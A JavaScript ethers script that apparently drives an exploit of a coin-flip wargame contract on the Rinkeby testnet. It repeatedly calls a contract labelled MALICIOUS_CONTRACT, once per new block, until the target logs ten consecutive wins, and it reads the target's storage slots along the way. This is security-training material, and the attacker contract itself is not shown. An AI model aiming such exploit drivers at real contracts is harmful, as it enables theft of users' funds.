/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const { chalk } = require('chalk')
const INSTANCE = "0x46D671d6C8fdE597c72346f56bF997f9e82D1DA0"
const MALICIOUS_CONTRACT = "0xB864828C25787D35d501Cd048Df5a7D5C19831BC"

async function instanceState(contract, rinkeby) {
  console.log('                          INSTANCE STATE')
  console.log("Storage '0'", await rinkeby.getStorageAt(INSTANCE, 0))
  console.log("Storage '1'", await rinkeby.getStorageAt(INSTANCE, 1))
  console.log("Storage '2'", await rinkeby.getStorageAt(INSTANCE, 2))
  console.log("Storage '3'", await rinkeby.getStorageAt(INSTANCE, 3))
  console.log("Storage '4'", await rinkeby.getStorageAt(INSTANCE, 4))
  console.log("Storage '5'", await rinkeby.getStorageAt(INSTANCE, 5))
  console.log("Storage '6'", await rinkeby.getStorageAt(INSTANCE, 6), '\n')
}

async function main() {
  const [deployer] = await ethers.getSigners();
  const rinkeby = ethers.getDefaultProvider('rinkeby')
  const signer = new ethers.Wallet( process.env.DEPLOYER_PRIVATE_KEY, rinkeby )


  // We get the contract to deploy
  let malicious = new ethers.Contract(MALICIOUS_CONTRACT, ['function flipGood() public returns (bool)'], rinkeby )
  malicious = malicious.connect(signer)
  let contract = new ethers.Contract(INSTANCE, ['function flip(bool) public returns (bool)', 'function consecutiveWins() public view returns (uint256)'], rinkeby)
  contract = contract.connect(signer)

  console.log('Contract functions:')
  console.log(malicious.functions, '\n')


  //await instanceState(contract, rinkeby)

  let previousBlock = {hash: "0X00000"}
  let counter = ethers.utils.formatEther(await contract.consecutiveWins())


  while (counter < 10) {
    block = await rinkeby.getBlock()
    if (block.hash === previousBlock.hash) {

    } else {
      try {
        console.log("Coin flip !")
        let tx = await malicious.flipGood()
        const receipt = await tx.wait()
        counter++
        console.log("counter:", counter)
        console.log("Storage '0'", await rinkeby.getStorageAt(INSTANCE, 0))
        previousBlock = block
        
      } catch (error) {
        console.log('fail')
        console.log(error)
      }
    }
  }

  console.log('Consecutive wins:', await contract.consecutiveWins())
 }

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
